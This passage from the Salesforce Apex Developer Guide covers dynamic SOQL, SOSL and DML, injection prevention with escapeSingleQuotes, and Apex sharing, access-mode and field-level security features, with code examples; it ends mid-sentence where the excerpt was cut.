_SOQL injection_ is a technique by which a user causes your application to execute database methods you didn’t intend by passing SOQL
statements into your code. This can occur in Apex code whenever your application relies on end-user input to construct a dynamic SOQL
statement and you don’t handle the input properly.

To prevent SOQL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation
marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
of database commands.

Additional Dynamic SOQL Methods

The Dynamic SOQL examples in this topic show how to use the `Database.query` and `Database.queryWithBinds` methods.
These methods also use Dynamic SOQL:

**•** `Database.countQuery` and `Database.countQueryWithBinds` : Return the number of records that a dynamic SOQL
query would return when executed.

**•** `Database.getQueryLocator` and `Database.getQueryLocatorWithBinds` : Create a `QueryLocator` object
used in batch Apex or Visualforce.

SEE ALSO:

_Apex Reference Guide_ [: System.Database Methods](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_methods)

##### Dynamic SOSL Dynamic SOSL refers to the creation of a SOSL string at run time with Apex code. Dynamic SOSL enables you to create more flexible

applications. For example, you can create a search based on input from an end user, or update records with varying field names.

To create a dynamic SOSL query at run time, use the search `query` method. For example:

```
   List<List <sObject>> myQuery = search.query( SOSL_search_string );

```

The following example exercises a simple SOSL query string.

```
   String searchquery='FIND\'Edge*\'IN ALL FIELDS RETURNING Account(id,name),Contact, Lead';

   List<List<SObject>>searchList=search.query(searchquery);

```


Apex Developer Guide Working with Data in Apex

Dynamic SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type.
The result lists are always returned in the same order as they were specified in the dynamic SOSL query. From the example above, the
results from Account are first, then Contact, then Lead.

The search `query` method can be used wherever an inline SOSL query can be used, such as in regular assignment statements and

`for` loops. The results are processed in much the same way as static SOSL queries are processed.

Dynamic SOSL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
and Limits on page 349.

[For a full description of SOSL query syntax, see Salesforce Object Search Language (SOSL) in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/sforce_api_calls_sosl.htm) _SOQL and SOSL Reference_ .

Use Dynamic SOSL to Return Snippets

To provide more context for records in search results, use the SOSL `WITH SNIPPET` clause. Snippets make it easier to identify the
[content you’re looking for. For information about how snippets are generated, see WITH SNIPPET in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/sforce_api_calls_sosl_with_snippet.htm) _SOQL and SOSL Reference_ .

To use the SOSL `WITH SNIPPET` clause in a dynamic SOSL query at run time, use the `Search.find` method.

```
   Search.SearchResults searchResults = Search.find( SOSL_search_string );

```

This example exercises a simple SOSL query string that includes a `WITH SNIPPET` clause. The example calls `System.debug()`
to print the returned titles and snippets. Your code would display the titles and snippets in a Web page.

```
   Search.SearchResults searchResults = Search.find('FIND \'test\' IN ALL FIELDS RETURNING

   KnowledgeArticleVersion(id, title WHERE PublishStatus = \'Online\' AND Language = \'en_US\')

    WITH SNIPPET (target_length=120)');

   List<Search.SearchResult> articlelist = searchResults.get('KnowledgeArticleVersion');

   for (Search.SearchResult searchResult : articleList) {

    KnowledgeArticleVersion article = (KnowledgeArticleVersion) searchResult.getSObject();

    System.debug(article.Title);

    System.debug(searchResult.getSnippet());

   }

```

SOSL Injection

_SOSL injection_ is a technique by which a user causes your application to execute database methods you did not intend by passing SOSL
statements into your code. A SOSL injection can occur in Apex code whenever your application relies on end-user input to construct a
dynamic SOSL statement and you do not handle the input properly.

To prevent SOSL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation
marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead
of database commands.

##### Dynamic DML

In addition to querying describe information and building SOQL queries at runtime, you can also create sObjects dynamically, and insert
them into the database using DML.

To create a new sObject of a given type, use the `newSObject` method on an sObject token. Note that the token must be cast into a
concrete sObject type (such as Account). For example:

```
   // Get a new account

   Account a = new Account();

```


Apex Developer Guide Working with Data in Apex

```
   // Get the token for the account

   Schema.sObjectType tokenA = a.getSObjectType();

   // The following produces an error because the token is a generic sObject, not an Account

   // Account b = tokenA.newSObject();

   // The following works because the token is cast back into an Account

   Account b = (Account)tokenA.newSObject();

```

Though the sObject token `tokenA` is a token of Account, it is considered an sObject because it is accessed separately. It must be cast
back into the concrete sObject type Account to use the `newSObject` method. For more information on casting, see Classes and
Casting on page 118.

You can also specify an ID with `newSObject` to create an sObject that references an existing record that you can update later. For
example:

```
   SObject s = Database.query('SELECT Id FROM account LIMIT 1')[0].getSObjectType().

                          newSObject([SELECT Id FROM Account LIMIT 1][0].Id);

```

[See SObjectType Class.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_Schema_SObjectType.htm)

Dynamic sObject Creation Example

This example shows how to obtain the sObject token through the `Schema.getGlobalDescribe` method and then creates a
new sObject using the `newSObject` method on the token. This example also contains a test method that verifies the dynamic creation
of an account.

```
   public class DynamicSObjectCreation {

      public static sObject createObject(String typeName) {

        Schema.SObjectType targetType = Schema.getGlobalDescribe().get(typeName);

        if (targetType == null) {

           // throw an exception

        }

        // Instantiate an sObject with the type passed in as an argument

        // at run time.

        return targetType.newSObject();

      }

   }

   @isTest

   private class DynamicSObjectCreationTest {

      static testmethod void testObjectCreation() {

        String typeName = 'Account';

        String acctName = 'Acme';

        // Create a new sObject by passing the sObject type as an argument.

        Account a = (Account)DynamicSObjectCreation.createObject(typeName);

        System.assertEquals(typeName, String.valueOf(a.getSobjectType()));

        // Set the account name and insert the account.

        a.Name = acctName;

        insert a;

        // Verify the new sObject got inserted.

        Account[] b = [SELECT Name from Account WHERE Name = :acctName];

        system.assert(b.size() > 0);

```


Apex Developer Guide Working with Data in Apex

```
      }

   }

```

Setting and Retrieving Field Values

Use the `get` and `put` methods on an object to set or retrieve values for fields using either the API name of the field expressed as a
String, or the field's token. In the following example, the API name of the field `AccountNumber` is used:

```
   SObject s = [SELECT AccountNumber FROM Account LIMIT 1];

   Object o = s.get('AccountNumber');

   s.put('AccountNumber', 'abc');

```

The following example uses the `AccountNumber` field's token instead:

```
   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.AccountNumber;

   Sobject s = Database.query('SELECT AccountNumber FROM Account LIMIT 1');

   s.put(dfr.getsObjectField(), '12345');

```

The Object scalar data type can be used as a generic data type to set or retrieve field values on an sObject. This is equivalent to the
[anyType field type. Note that the Object data type is different from the sObject data type, which can be used as a generic type for any](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/field_types.htm)
sObject.

Note: Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String
value that is too long for the field.

Setting and Retrieving Foreign Keys

Apex supports populating foreign keys by name (or external ID) in the same way as the API. To set or retrieve the scalar ID value of a
foreign key, use the `get` or `put` methods.

To set or retrieve the _record_ associated with a foreign key, use the `getSObject` and `putSObject` methods. Note that these
methods must be used with the sObject data type, not Object. For example:

```
   SObject c =

     Database.query('SELECT Id, FirstName, AccountId, Account.Name FROM Contact LIMIT 1');

   SObject a = c.getSObject('Account');

```

There is no need to specify the external ID for a parent sObject value while working with child sObjects. If you provide an ID in the parent
sObject, it is ignored by the DML operation. Apex assumes the foreign key is populated through a relationship SOQL query, which always
returns a parent object with a populated ID. If you have an ID, use it with the child object.

For example, suppose that custom object C1 has a foreign key `C2__c` that links to a parent custom object C2. You want to create a C1
object and have it associated with a C2 record named 'AW Computing' (assigned to the value `C2__r` ). You do not need the ID of the
'AW Computing' record, as it is populated through the relationship of parent to child. For example:

```
   insert new C1__c(Name = 'x', C2__r = new C2__c(Name = 'AW Computing'));

```

If you had assigned a value to the ID for `C2__r`, it would be ignored. If you do have the ID, assign it to the object ( `C2__c` ), not the
record.

You can also access foreign keys using dynamic Apex. The following example shows how to get the values from a subquery in a
parent-to-child relationship using dynamic Apex:

```
   String queryString = 'SELECT Id, Name, ' +

          '(SELECT FirstName, LastName FROM Contacts LIMIT 1) FROM Account';

   SObject[] queryParentObject = Database.query(queryString);

```


Apex Developer Guide Working with Data in Apex

```
   for (SObject parentRecord : queryParentObject){

      Object ParentFieldValue = parentRecord.get('Name');

      // Prevent a null relationship from being accessed

      SObject[] childRecordsFromParent = parentRecord.getSObjects('Contacts');

      if (childRecordsFromParent != null) {

        for (SObject childRecord : childRecordsFromParent){

           Object ChildFieldValue1 = childRecord.get('FirstName');

           Object ChildFieldValue2 = childRecord.get('LastName');

           System.debug('Account Name: ' + ParentFieldValue +

           '. Contact Name: '+ ChildFieldValue1 + ' ' + ChildFieldValue2);

        }

      }

   }

#### Apex Security and Sharing Model

```

The Apex security model includes record-level, field-level, and object-level security mechanisms. You can control record-level security
modes by using the `with sharing`, `without sharing`, and `inherited sharing` keywords on classes. Apex runs in
user mode by default, which means that user permissions on objects and field-level security are respected. A user cannot run code that
tries to access fields or objects that are hidden from the user. Other security mechanisms include the
`Security.stripInaccessible()` method, and Field and SObject describe methods.

Versioned Behavior Changes

In API version 67.0 and later, you can’t use the `WITH SECURITY_ENFORCED` clause in SOQL `SELECT` queries in Apex code. Instead,
use the `WITH USER_MODE` clause.

In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security
(FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default.

In API version 67.0 and later, classes without an explicit sharing declaration run in `with sharing` mode. In API version 66.0 and
earlier, the sharing mode of classes without an explicit sharing declaration is determined according these factors.

**•** If the class is part of an inheritance chain, and any class in that chain is saved as API version 67.0 and later, the class runs in `with`
`sharing` mode.

**•** If the class is an Aura controller or an `@AuraEnabled` method called from a Lightning web component, the class runs in `with`
`sharing` mode.

**•** If the class isn’t an Apex entry point, its sharing mode is defined by the sharing mode of the calling class.

**•** Otherwise, the class runs in `without sharing` mode.

Enforce Sharing Rules
In Apex, sharing rules are always enforced by default. Use the with sharing, without sharing, and inherited sharing keywords to
control record-level security. If you don't want sharing rules to be enforced, then you must declare a class with the `without`
`sharing` keyword.

Enforce Object and Field Permissions
Apex generally runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced
during code execution. To ignore the FLS and object permissions of the current user, you must explicitly set a database operation
or query to run in system mode. For fine-grained control, you can check the current user’s permissions for an object or a field, and
then perform a specific DML operation or a query only if the user has sufficient permissions.


Apex Developer Guide Working with Data in Apex

Class Security

Understanding Apex Managed Sharing
_Sharing_ is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing
access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex.

Security Tips for Apex and Visualforce Development

SEE ALSO:

Enforce Security with Field and SObject Describe Methods

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Security.htm#apex_System_Security_methods)_ : stripInaccessible()

##### Enforce Sharing Rules

In Apex, sharing rules are always enforced by default. Use the with sharing, without sharing, and inherited sharing keywords to control
record-level security. If you don't want sharing rules to be enforced, then you must declare a class with the `without sharing`
keyword.

Note: Apex code that is executed with the `executeAnonymous` call and Connect in Apex always execute using the sharing
rules of the current user. See Anonymous Blocks on page 265.

Sharing rules are distinct from, and can co-exist with object-level and field-level permissions. While `with sharing` is the default
sharing mode, Salesforce recommends that you use keyword declarations on all your classes to make your code easier to maintain. For
more information, see Use the with sharing, without sharing, and inherited sharing Keywords.

Note: Using the `with sharing` keyword doesn’t enforce the user’s permissions and field-level security.

This example has two classes, the first class ( `CWith` ) enforces sharing rules while the second class ( `CWithout` ) doesn’t. The `CWithout`
class calls a method from the first, which runs with sharing rules enforced. The `CWithout` class contains an inner class, in which code
executes under the same sharing context as the caller. It also contains a class that extends it, which inherits its without sharing setting.

```
   public with sharing class CWith {

     // All code in this class operates with enforced sharing rules.

     Account a = [SELECT . . . ];

     public static void m() { . . . }

     static {

      . . .

     }

     {

      . . .

     }

     public void c() {

      . . .

     }

   }

   public without sharing class CWithout {

     // All code in this class ignores sharing rules and operates

     // as if the context user has the Modify All Data permission.

```


Apex Developer Guide Working with Data in Apex

```
     Account a = [SELECT . . . ];

     . . .

     public static void m() {

      . . .

      // This call into CWith operates with enforced sharing rules

      // for the context user. When the call finishes, the code execution

      // returns to without sharing mode.

      CWith.m();

     }

     public class CInner {

      // All code in this class executes with the same sharing context

      // as the code that calls it.

      // Inner classes are separate from outer classes.

      . . .

      // Again, this call into CWith operates with enforced sharing rules

      // for the context user, regardless of the class that initially called this inner

   class.

      // When the call finishes, the code execution returns to the sharing mode that was

   used to call this inner class.

      CWith.m();

     }

     public class CInnerWithOut extends CWithout {

      // All code in this class ignores sharing rules because

      // this class extends a parent class that ignores sharing rules.

     }

   }

```

Warning: Because a class declared as `with sharing` can call a class declared as `without sharing`, you may still have
to implement class-level security. In addition, all SOQL and SOSL queries that use Pricebook2 ignore the `with sharing`
keyword. All price books are returned, regardless of the applied sharing rules.

Enforcing the current user's sharing rules can impact:

**•** SOQL and SOSL queries. A query can return fewer rows than it would operating in system context.

**•** DML operations. An operation can fail because the current user doesn't have the correct permissions. For example, if the user specifies
a foreign key value that exists in the organization, but which the current user doesn’t have access to, then the DML operation fails.

Versioned Behavior Changes

In API version 67.0 and later, classes without an explicit sharing declaration are run in the current user context. In API version 66.0 and
earlier, for classes without an explicit sharing declaration, the current sharing rule remains in effect.

SEE ALSO:

Use the with sharing, without sharing, and inherited sharing Keywords

_Salesforce Help_ [: Sharing Rules](https://help.salesforce.com/s/articleView?id=platform.security_about_sharing_rules.htm&type=5&language=en_US)


Apex Developer Guide Working with Data in Apex

##### Enforce Object and Field Permissions

Apex generally runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced
during code execution. To ignore the FLS and object permissions of the current user, you must explicitly set a database operation or
query to run in system mode. For fine-grained control, you can check the current user’s permissions for an object or a field, and then
perform a specific DML operation or a query only if the user has sufficient permissions.

Set an Access Mode for Database Operations

You can run database operations and SOQL queries in either user mode or system mode. See Set an Access Mode for Database Operations
on page 217.

Check Field-Level Permissions

You can also enforce object-level and field-level permissions in your code by explicitly calling the access control methods of the
[Schema.DescribeSObjectResult and the Schema.DescribeFieldResult classes. See Enforce Security with Field and SObject Describe](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
Methods on page 222.

Considerations

**•** Object-level and field-level permissions are distinct from sharing rules, which enforce specific record access. They can coexist. If
sharing rules are defined in Salesforce, you can enforce them at the class level by declaring the class with the `with sharing`
[keyword. See Use the with sharing, without sharing, and inherited sharing Keywords. If you call the Schema.DescribeSObjectResult](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)
[and Schema.DescribeFieldResult access control methods, the verification of object and field-level permissions is performed in addition](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_fields_describe.htm)
to the sharing rules that are in effect. Sometimes, the access level granted by a sharing rule can conflict with an object-level or
field-level permission. In that case, object-level and field-level permissions take precedence over sharing rules.

**•** [Orgs with Experience Cloud sites enabled provide various settings to hide a user’s personal information from other users. See Manage](https://help.salesforce.com/s/articleView?id=platform.users_manage_personal_info_visibility.htm&type=5&language=en_US)
[Personal User Information Visibility and Share Personal Contact Information Within Experience Cloud Sites. These settings aren’t](https://help.salesforce.com/s/articleView?id=platform.users_manage_personal_info_visibility.htm&type=5&language=en_US)
enforced in Apex, even with security features such as the `WITH USER_MODE` clause or the `stripInaccessible` method.
[To hide specific fields on the User object in Apex, follow the example code outlined in Comply with a User’s Personal Information](https://developer.salesforce.com/docs/atlas.en-us.262.0.communities_dev.meta/communities_dev/communities_dev_pii_settings.htm)
[Visibility Settings.](https://developer.salesforce.com/docs/atlas.en-us.262.0.communities_dev.meta/communities_dev/communities_dev_pii_settings.htm)

**•** Automated Process users can’t perform Object and FLS checks in custom code unless appropriate permission sets are explicitly
applied to those users.

Versioned Behavior Changes

In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security
(FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default.

Set an Access Mode for Database Operations
Apex database operations run in user mode by default, which means that they apply the sharing rules, field-level security (FLS), and
object permissions of the running user. Database operations only ignore FLS and object permissions if you explicitly set them to run
in system mode.

Enforce Security with the stripInaccessible Method
Use the `stripInaccessible` method to enforce field-level and object-level data protection by stripping fields and relationship
fields from query and subquery results that the user can’t access. The method can also be used to remove inaccessible sObject fields
before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an untrusted source.


Apex Developer Guide Working with Data in Apex

Enforce Security with Field and SObject Describe Methods
At the most granular level, you can enforce object-level and field-level permissions in your code by explicitly calling the
`Schema.DescribeSObjectResult` and the `Schema.DescribeFieldResult` methods to check the current user’s
access permission levels.

SEE ALSO:

_Salesforce Help_ [: Set Up Your Users’ Object, User, and Field Permissions](https://help.salesforce.com/s/articleView?id=platform.security_data_access_mgmt.htm&type=5&language=en_US)

###### Set an Access Mode for Database Operations

Apex database operations run in user mode by default, which means that they apply the sharing rules, field-level security (FLS), and
object permissions of the running user. Database operations only ignore FLS and object permissions if you explicitly set them to run in
system mode.

Note: If you set a database operation to user mode, the operation always respects the user’s sharing rules. However, if you set
the operation to system mode, the sharing keyword on the calling class determines whether the operation respects the user’s
record-level permissions. See Use the with sharing, without sharing, and inherited sharing Keywords.

Set an Access Mode for SOQL and SOSL Queries

To indicate an access mode for a SOQL or SOSL query, insert a `WITH USER_MODE` or `WITH SYSTEM_MODE` clause. This example
specifies user mode in SOQL.

```
   List<Account> acc = [SELECT Id FROM Account WITH USER_MODE];

```

In SOQL queries, user mode:

**•** Supports polymorphic fields, such as as `Owner` and `Task.whatId` .

**•** Processes all clauses in the SOQL `SELECT` statement including the `WHERE` clause.

**•** Finds all FLS errors in your SOQL query.

**•** Supports the `getInaccessibleFields()` method on QueryException to examine the full set of access errors.

Set an Access Mode for DML Statements

To indicate an access mode for a DML statement, insert the `as user` or `as system` keywords between the DML operator and the
object name. This example inserts a new account in user mode.

```
   Account acc = new Account(Name='test');

             insert as user acc;

```

Tip: If you run DML operations in user mode, you can use the `DMLException` method `getDmlFieldNames()` to obtain
the fields with FLS errors.

Set an Access Mode for Database and Search Methods

The `[AccessLevel](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_AccessLevel.htm#apex_class_System_AccessLevel)` class represents the two modes in which Apex runs database operations. Use this class to define the mode as user
mode or system mode.

An _`accessLevel`_ parameter in Database and Search methods specifies whether the method runs in user mode
( `AccessLevel.USER_MODE` ) or system mode ( `AccessLevel.SYSTEM_MODE` ).

These DML and query operations support the _`accessLevel`_ parameter.


Apex Developer Guide Working with Data in Apex

**•** `[Database.query](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_query_2)` method. See Dynamic SOQL.

**•** `[Database.getQueryLocator](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getQueryLocator_3)` methods

**•** `[Database.countQuery](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_countQuery_2)` method

**•** `[Database.getCursor](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getCursor_2)` method

**•** `[Database.getPaginationCursor](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_database_getPaginationCursor)` method

**•** `[Search.query](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_search.htm#apex_System_Search_query_2)` method

**•** [Database DML methods (](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm) `insert`, `update`, `upsert`, `merge`, `delete`, `undelete`, and `convertLead` ). Includes the
`*Immediate` and `*Async` methods, such as `insertImmediate` and `deleteAsync` .

Tip: If you run Database DML methods with `AccessLevel.USER_MODE`, you can access errors via
`SaveResult.getErrors().getFields()` .

These Database methods require the _`accessLevel`_ parameter.

**•** `[Database.queryWithBinds](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_queryWithBinds)` .

**•** `[Database.getQueryLocatorWithBinds](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getQueryLocatorWithBinds)`

**•** `[Database.countQueryWithBinds](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_countQueryWithBinds)`

**•** `[Database.getCursorWithBinds](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_Database_getCursorWithBinds)`

**•** `[Database.getPaginationCursorWithBinds](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_database.htm#apex_System_database_getPaginationCursorWithBinds)`

Use Permission Sets to Enforce Security in DML and Search Operations (Developer Preview)

In Developer Preview, you can specify a permission set that to augment the field-level and object-level security for database and search
operations. Run the `AccessLevel.withPermissionSetId()` method with a specified permission set ID. Specific user mode
DML operations that are performed with that `AccessLevel`, respect the permissions in the specified permission set, in addition to
the running user’s permissions.

This example runs the `AccessLevel.withPermissionSetId()` method with the specified permission set and inserts a
custom object.

```
   @IsTest

   public with sharing class ElevateUserModeOperations_Test {

     @IsTest

     static void objectCreatePermViaPermissionSet() {

      Profile p = [

       SELECT Id

       FROM Profile

       WHERE Name = 'Minimum Access - Salesforce'

      ];

      User u = new User(

       Alias = 'standt',

       Email = 'standarduser@testorg.com',

       EmailEncodingKey = 'UTF-8',

       LastName = 'Testing',

       LanguageLocaleKey = 'en_US',

       LocaleSidKey = 'en_US',

       ProfileId = p.Id,

       TimeZoneSidKey = 'America/Los_Angeles',

       UserName = 'standarduser' + DateTime.now().getTime() + '@testorg.com'

      );

      System.runAs(u) {

```


Apex Developer Guide Working with Data in Apex

```
       try {

        Database.insert(new Account(name = 'foo'), AccessLevel.User_mode);

        Assert.fail();

       } catch (SecurityException ex) {

        Assert.isTrue(ex.getMessage().contains('Account'));

       }

       //Get ID of previously created permission set named 'AllowCreateToAccount'

       Id permissionSetId = [

        SELECT Id

        FROM PermissionSet

        WHERE Name = 'AllowCreateToAccount'

        LIMIT 1

       ]

       .Id;

       Database.insert(

        new Account(name = 'foo'),

        AccessLevel.User_mode.withPermissionSetId(permissionSetId)

       );

       // The elevated access level is not persisted to subsequent operations

       try {

        Database.insert(new Account(name = 'foo2'), AccessLevel.User_mode);

        Assert.fail();

       } catch (SecurityException ex) {

        Assert.isTrue(ex.getMessage().contains('Account'));

       }

      }

     }

   }

```

[Note: Checkmarx, the AppExchange Security Review source code scanner, isn’t updated with this new Apex feature. Until it’s](https://developer.salesforce.com/docs/atlas.en-us.262.0.packagingGuide.meta/packagingGuide/security_review_partner_security_portal_scanners.htm)
updated, Checkmarx can generate false positives for field or object-level security violations that require exception documentation.

Versioned Behavior Changes

In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security
(FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default.

###### Enforce Security with the stripInaccessible Method

Use the `stripInaccessible` method to enforce field-level and object-level data protection by stripping fields and relationship
fields from query and subquery results that the user can’t access. The method can also be used to remove inaccessible sObject fields
before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an untrusted source.

The `Security.stripInaccessible()` method takes a permission set ID as a parameter and enforces field-level and object-level
access as per the specified permission set, in addition to the running user’s permissions.

The method allows graceful degradation of the application by omitting fields, rather than failing outright, and is similar to the behavior
with views, reports, and layouts. Developers can enforce security at the level of business processes, and not merely at the object, field,
or row level. This approach allows coverage of a large number of platform features that pass records into Apex from potentially untrusted
sources such as Apex REST, Lightning clients, and so on.


Apex Developer Guide Working with Data in Apex

Note: The ID field is never stripped by the `stripInaccessible` method to avoid issues when performing DML on the
result.

Implementation Details

[The field-level and object-level data protection is accessed through the Security and SObjectAccessDecision classes. The access check](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Security.htm)
is based on the field-level permission of the current user in the context of the specified operation—create, read, update, or upsert. The
[Security.stripInaccessible() method checks the source records for fields that don’t meet the field-level security check for the current user.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Security.htm)
The method also checks the source records for lookup or master-detail relationship fields to which the current user doesn’t have access.
The method creates a return list of sObjects that is identical to the source records, except that the fields that are inaccessible to the
current user are removed. The sObjects returned by the `getRecords` method contain records in the same order as the sObjects in
the `sourceRecords` parameter of the `stripInaccessible` method.

Considerations

**•** Use this feature for graceful degradation on errors by omitting fields, rather than failing outright.

**•** The `stripInaccessible` method doesn’t support AggregateResult SObject. If the source records are of AggregateResult
SObject type, an exception is thrown.

**•** To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with
[Experience Cloud sites, see Enforcing Object and Field Permissions.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_classes_perms_enforcing.htm)

Examples

These examples show several applications of the `stripInaccessible` method.

This example code removes inaccessible fields from the query result. A display table for campaign data must always show the
`BudgetedCost` . The `ActualCost` must be shown only to users who have permission to read that field.

```
   SObjectAccessDecision securityDecision =

         Security.stripInaccessible(AccessType.READABLE,

              [SELECT Name, BudgetedCost, ActualCost FROM Campaign] );

      // Construct the output table

      if (securityDecision.getRemovedFields().get('Campaign').contains('ActualCost')) {

        for (Campaign c : securityDecision.getRecords()) {

        //System.debug Output: Name, BudgetedCost

        }

      } else {

        for (Campaign c : securityDecision.getRecords()) {

        //System.debug Output: Name, BudgetedCost, ActualCost

        }

   }

```

This example code removes inaccessible fields from the subquery result. The user doesn’t have permission to read the `Phone` field of
a Contacts object.

```
   List<Account> accountsWithContacts =

    [SELECT Id, Name, Phone,

      (SELECT Id, LastName, Phone FROM Account.Contacts)

    FROM Account];

     // Strip fields that are not readable

```


Apex Developer Guide Working with Data in Apex

```
     SObjectAccessDecision decision = Security.stripInaccessible(

                         AccessType.READABLE,

                         accountsWithContacts);

   // Print stripped records

     for (Integer i = 0; i < accountsWithContacts.size(); i++)

     {

       System.debug('Insecure record access: '+accountsWithContacts[i]);

       System.debug('Secure record access: '+decision.getRecords()[i]);

     }

   // Print modified indexes

     System.debug('Records modified by stripInaccessible: '+decision.getModifiedIndexes());

   // Print removed fields

     System.debug('Fields removed by stripInaccessible: '+decision.getRemovedFields());

```

This example code removes inaccessible fields from sObjects before DML operations. The user who doesn’t have permission to create
Rating for an Account can still create an Account. The method ensures that no Rating is set and doesn’t throw an exception.

```
   List<Account> newAccounts = new List<Account>();

   Account a = new Account(Name='Acme Corporation');

   Account b = new Account(Name='Blaze Comics', Rating=’Warm’);

   newAccounts.add(a);

   newAccounts.add(b);

   SObjectAccessDecision securityDecision = Security.stripInaccessible(

                            AccessType.CREATABLE, newAccounts);

   // No exceptions are thrown and no rating is set

   insert securityDecision.getRecords();

   System.debug(securityDecision.getRemovedFields().get('Account')); // Prints "Rating"

   System.debug(securityDecision.getModifiedIndexes()); // Prints "1"

```

This example code sanitizes sObjects that have been deserialized from an untrusted source. The user doesn’t have permission to update
the `AnnualRevenue` of an Account.

```
   String jsonInput =

   '[' +

   '{' +

   '"Name": "InGen",' +

   '"AnnualRevenue": "100"' +

   '},' +

   '{' +

   '"Name": "Octan"' +

   '}' +

   ']';

   List<Account> accounts = (List<Account>)JSON.deserializeStrict(jsonInput,

   List<Account>.class);

   SObjectAccessDecision securityDecision = Security.stripInaccessible(

                            AccessType.UPDATABLE, accounts);

```


Apex Developer Guide Working with Data in Apex

```
   // Secure update

   update securityDecision.getRecords(); // Doesn’t update AnnualRevenue field

   System.debug(String.join(securityDecision.getRemovedFields().get('Account'), ', ')); //

   Prints "AnnualRevenue"

   System.debug(String.join(securityDecision.getModifiedIndexes(), ', ')); // Prints "0”

```

This example code removes inaccessible relationship fields from the query result. The user doesn’t have permission to insert the
`Account__c` field, which is a lookup from MyCustomObject__c to Account.

```
   // Account__c is a lookup from MyCustomObject__c to Account

   @IsTest

     public class TestCustomObjectLookupStripped {

       @IsTest static void caseCustomObjectStripped() {

         Account a = new Account(Name='foo');

         insert a;

         List<MyCustomObject__c> records = new List<MyCustomObject__c>{

           new MyCustomObject__c(Name='Custom0', Account__c=a.id)

         };

         insert records;

         records = [SELECT Id, Account__c FROM MyCustomObject__c];

         SObjectAccessDecision securityDecision = Security.stripInaccessible

                                 (AccessType.READABLE, records);

         // Verify stripped records

         System.assertEquals(1, securityDecision.getRecords().size());

         for (SObject strippedRecord : securityDecision.getRecords()) {

           System.debug('Id should be set as Id fields are ignored: ' +

                    strippedRecord.isSet('Id')); // prints true

           System.debug('Lookup field FLS is not READABLE to running user,

                    should not be set: ' +

                    strippedRecord.isSet('Account__c')); // prints false

         }

       }

     }

```

Versioned Behavior Changes

In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security
(FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default.

SEE ALSO:

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_enum_System_AccessType.htm)_ : AccessType Enum

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_Security.htm)_ : Security Class

_Apex Reference Guide_ [: SObjectAccessDecision Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_SObjectAccessDecision.htm)

###### Enforce Security with Field and SObject Describe Methods

At the most granular level, you can enforce object-level and field-level permissions in your code by explicitly calling the
